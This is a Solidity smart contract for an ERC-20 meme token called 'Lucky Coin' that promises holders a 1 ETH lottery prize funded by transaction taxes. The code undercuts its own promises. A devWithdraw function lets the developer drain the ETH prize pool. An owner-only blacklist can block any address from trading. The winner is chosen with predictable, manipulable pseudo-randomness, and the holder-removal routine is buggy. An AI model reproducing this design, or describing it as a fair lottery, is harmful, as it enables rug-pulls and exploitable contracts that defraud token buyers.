/* --------------------------------------------------------------------------- */
    /*                 This is a simple and interesting contract !                 */
    /*       You only need to hold 1,000,000 Lucky(initial value 0.01 ETH)         */
    /*       You have a chance to get 1 ETH when contract tax reaches 1ETH         */
    /*                            Initial tax = 30                                 */
    /*                After openTrading() 5 minute removeLimit(), Tax = 5          */
    /*                    Initial Everyone MaxTotal = 1,000,000                    */
    /*                After removeLimit(), MaxTotal = 10,000,000                   */
    /*        4/5 Tax to contract, It converts taxes to eth when anyone sells      */
    /*               1/5 Tax to Dev, Will be used to promote the token             */
    /*                              100% to LP                                     */    
    /*                        Good Lucky Exeryone !!!                              */    
    /* --------------------------------------------------------------------------- */
    /*                         twitter.com/0xLuckyCoin                             */
    /*                            t.me/xLucky_Coin                                 */
    /* --------------------------------------------------------------------------- */

// 
// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval (address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract Lucky is Context, IERC20, Ownable {
    using SafeMath for uint256;
    /* -------------------------------------------------------------------------- */
    /*                                  contract                                  */
    /* -------------------------------------------------------------------------- */
    string private constant _name = unicode"LUCKY";
    string private constant _symbol = unicode"Lucky Coin";
    mapping (address => uint256) private _balances;
    mapping (address => bool) public isLuckyHolder;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    mapping (address => bool) private bots;
    address payable private _devWallet;
    uint8 private constant _decimals = 18;
    uint256 private constant _totalSupply = 100000000 * 10**_decimals;  //Anyone max hold 10000000 Lucky
    uint256 private constant _MaxTotal = 10000001 * 10**_decimals;      //Anyone max hold 10000000 Lucky
    uint256 private constant _limitMaxTotal = 1000001 * 10**_decimals;   //Anyone max hold 1000000 Lucky before removeLomit()
    uint256 private constant _luckySupply = 1000000 * 10**_decimals;      //Hold 1% and have the opportunity to participate  
    uint256 private constant tokenToETHThreshold = 10000 * 10**_decimals;  //Make sure every times update Progress
    uint256 private constant ONE_ETH = 1 * 10**_decimals;                   //Lucky holder reward
    /* -------------------------------------------------------------------------- */
    /*                                 swapState                                  */
    /* -------------------------------------------------------------------------- */
    uint256 private maxTxAmount;
    bool private tradingOpen = false;
    uint8 private Tax;
    bool private inSwap = false;
    uint256 firstBlock;
    /* -------------------------------------------------------------------------- */
    /*                                   uniswapV2                                */
    /* -------------------------------------------------------------------------- */
    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    /* -------------------------------------------------------------------------- */
    /*                                   events                                   */
    /* -------------------------------------------------------------------------- */
    event MaxTxAmountUpdated(uint _maxTxAmount);
    event Log(uint256 amount, uint256 gas);
    event received(address sender, uint256 value);
    event fallbackCalled(address sender, uint256 value, bytes data);

    constructor () {
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        _approve(address(this), address(uniswapV2Router), _totalSupply);

        Tax = 30;
        maxTxAmount = _limitMaxTotal;
        CurrentRound = 0;

        _devWallet = payable(_msgSender());
        _balances[_msgSender()] = _totalSupply;

        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[uniswapV2Pair] = true;
        _isExcludedFromFee[_devWallet] = true;

        emit MaxTxAmountUpdated(maxTxAmount);
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function isContract(address account) private view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function _transfer(address from,address to,uint256 amount) internal {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        if (!tradingOpen && (from != owner() && from != address(this) && to != owner())) {
            revert("Trading not enabled");
        }

        uint256 taxAmount = 0;
        uint256 devAmount = 0;//   1/5 taxAmount to dev
        uint256 contractAmount = 0;//   4/5 taxAmount to contract
        if (from != owner() && to != owner()) {
            require(!bots[from] && !bots[to]);
            //buy
            if (from == uniswapV2Pair && to != address(uniswapV2Router) && !_isExcludedFromFee[to] ) {
                require(amount <= maxTxAmount, "Exceeds the maxTxAmount.");
                require(balanceOf(to) + amount <= maxTxAmount, "Exceeds the maxTxAmount.");
                taxAmount = amount.mul(Tax).div(100);
                if (firstBlock + 3  > block.number) {
                    require(!isContract(to));
                }
            }
            //transfer
            if (to != uniswapV2Pair && !_isExcludedFromFee[to]) {
                require(balanceOf(to) + amount <= maxTxAmount, "Exceeds the maxTxAmount.");
                taxAmount = amount.mul(Tax).div(100);
            }
            //sell
            if(to == uniswapV2Pair && !_isExcludedFromFee[from]){
                taxAmount = amount.mul(Tax).div(100);
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniswapV2Pair && tradingOpen && contractTokenBalance > tokenToETHThreshold ) {
                swapTokensForEth(contractTokenBalance);
            }
        }
        if(taxAmount > 0){
            devAmount = taxAmount.div(5);//   1/5 taxAmount to dev
            contractAmount = taxAmount.div(5).mul(4);//   4/5 taxAmount to contract
            //transfer Tax to dev
            _balances[_devWallet] = _balances[_devWallet].add(devAmount);
            emit Transfer(from, _devWallet, devAmount);
            //Transfer Tax to contracts
            _balances[address(this)] = _balances[address(this)].add(contractAmount);
            emit Transfer(from, address(this), contractAmount);
        }
        _balances[from]=_balances[from].sub(amount);
        _balances[to]=_balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
            
        checkHolders(from, to);
        
        if(updateProgress() == 10000){Draw();}

    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve((address(this)),address(uniswapV2Router),type(uint256).max);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function addBots(address[] memory bots_) public onlyOwner {
        for (uint i = 0; i < bots_.length; i++) {
            bots[bots_[i]] = true;
        }
    }

    function delBots(address[] memory notbot) public onlyOwner {
      for (uint i = 0; i < notbot.length; i++) {
          bots[notbot[i]] = false;
      }
    }

    function isBot(address a) public view returns (bool){
      return bots[a];
    }

    function openTrading() external onlyOwner() {
        require(!tradingOpen,"trading is already open");
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        firstBlock = block.number;
        RoundStartMoney = getContractETHBalance();
        tradingOpen = true;
    }

    function removeLimit() public onlyOwner {
        require(tradingOpen == true, "Must open trading before");
        Tax = 5;
        maxTxAmount = _MaxTotal;
        emit MaxTxAmountUpdated(maxTxAmount);
    }

    function getContractETHBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function devWithdraw(uint256 eth) public payable {
        require(_msgSender() == _devWallet, "Only dev");
        if (address(this).balance >= eth) {
            payable(_devWallet).transfer(eth);

            if (RoundStartMoney > eth) {
                RoundStartMoney -= eth;
            } else {
                RoundStartMoney = 0;
            }
        }
    }

    /* -------------------------------------------------------------------------- */
    /*                                    lucky                                   */
    /* -------------------------------------------------------------------------- */

    struct Winner {
        uint256 Round;
        address WinnerAddress;
    }
    Winner _Winner;
    uint256 drawTime;
    uint256 CurrentRound;
    uint256 RoundStartMoney;
    uint256 progress;
    address[] luckyHolders;
    address[] tempHolds;

    function checkHolders(address from, address to) private {
        if(from != uniswapV2Pair && from != address(this) && from != address(0)){
            if(_balances[from] >= _luckySupply && isLuckyHolder[from] == false) {
                isLuckyHolder[from] = true;
                luckyHolders.push(from);
            }else if(_balances[from] >= _luckySupply && isLuckyHolder[from] == true){
                if(!checkluckyHolders(luckyHolders,from)){
                    isLuckyHolder[from] = true;
                    luckyHolders.push(from);
                }
            }else{
                if(isLuckyHolder[from] == true){
                    luckyHolders = removeAddressFromluckyHolders(luckyHolders,from);
                }
                isLuckyHolder[from] = false;
            }
        }

        if(to != uniswapV2Pair && to != address(this) && to != address(0)){
            if(_balances[to] >= _luckySupply && isLuckyHolder[to] == false) {
                isLuckyHolder[to] = true;
                luckyHolders.push(to);
            }else if(_balances[to] >= _luckySupply && isLuckyHolder[to] == true){
                if(!checkluckyHolders(luckyHolders,to)){
                    isLuckyHolder[to] = true;
                    luckyHolders.push(to);
                }
            }else{
                if(isLuckyHolder[to] == true){
                    luckyHolders = removeAddressFromluckyHolders(luckyHolders,to);
                }
                isLuckyHolder[to] = false;
            }
        }
    }

    function checkluckyHolders(
        address[] memory array,
        address checkAddress
    ) private pure returns (bool) {
        uint256 length = array.length;
        bool inLuckyHolders = false;

        for (uint256 i = 0; i < length; i++) {
            if (array[i] == checkAddress) {
                inLuckyHolders = true;
            }
        }
        return inLuckyHolders;
    }

    function removeAddressFromluckyHolders(
        address[] memory array,
        address addressToRemove
    ) private returns (address[] memory) {
        uint256 length = array.length;
        tempHolds = new address[](length);
        uint256 resultIndex = 0;
        uint8 deleteNum = 0;

        for (uint256 i = 0; i < length; i++) {
            if (array[i] != addressToRemove) {
                tempHolds[resultIndex] = array[i];
                resultIndex++;
            }
        }
        for (uint256 d = 0; d < deleteNum; d++){
            tempHolds.pop();
        }
        return tempHolds;
    }

    function whoIsWinner()external view returns (uint256, uint256, address){
        return (_Winner.Round, drawTime, _Winner.WinnerAddress);
    }

    function updateProgress() private returns (uint256) {
        progress = getContractETHBalance().sub(RoundStartMoney).mul(10000).div(ONE_ETH);
        if (progress > 10000) progress = 10000;
        return (progress);
    }

    function showProgress() public view returns (uint256) {
        return (progress);
    }

    function showHolds() public view returns (address[] memory Holds) {
        return (luckyHolders);
    }    

    function getWinner() private view returns (address) {
        uint256 randomNumber = uint256(
            keccak256(
                abi.encodePacked(
                    block.timestamp,
                    msg.sender,
                    luckyHolders.length
                )
            )
        );
        uint256 LuckyNum = randomNumber % luckyHolders.length;
        return luckyHolders[LuckyNum];
    }

    /* -------------------------------------------------------------------------- */
    /*                               Draw !!!                                     */
    /*                         When progress = 10000                              */
    /*                    Anyone sell token will active Draw()                    */
    /*   The contract will randomly select a holder( >=1% total) and send 1ETH    */
    /* -------------------------------------------------------------------------- */
    function Draw() public payable returns (uint256, address) {
        require(luckyHolders.length > 0,"Lucky holders is empty");
        if (progress == 10000 && getContractETHBalance() > ONE_ETH) {
            _Winner.Round = CurrentRound + 1;
            _Winner.WinnerAddress = getWinner();
            drawTime = block.timestamp;
            //send 1ETH  
            payable(_Winner.WinnerAddress).transfer(ONE_ETH);

            RoundStartMoney = getContractETHBalance();
            progress = 0;

            return (_Winner.Round, _Winner.WinnerAddress);
        } else return (_Winner.Round, _Winner.WinnerAddress);
    }

    receive() external payable {
        emit Log(msg.value, gasleft());
    }

    fallback() external payable {
        emit fallbackCalled(_msgSender(), msg.value, msg.data);
    }

}